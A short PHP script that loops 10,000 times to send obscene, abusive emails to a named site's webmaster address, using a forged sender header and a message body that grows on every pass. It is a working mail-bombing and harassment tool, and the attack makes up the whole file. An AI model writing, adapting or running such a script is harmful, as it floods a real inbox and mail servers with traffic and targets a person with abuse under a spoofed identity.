<?php


// http://fast-look.com/

for($t=0;$t<10000;$t++){
$fsubject = "fuck you and your spyware shit on my pc";
$fheaders = "From: fuck you <fuckyou@youdick.com>";
$faddress = "webmaster@fast-look.com";
$fmsg .= "the fuck are you gona do about it bitch\n";

mail($faddress, $fsubject, $fmsg, $fheaders);
echo "<br><br><br><center>Thanks $fname for your mail!<br>";

}


?>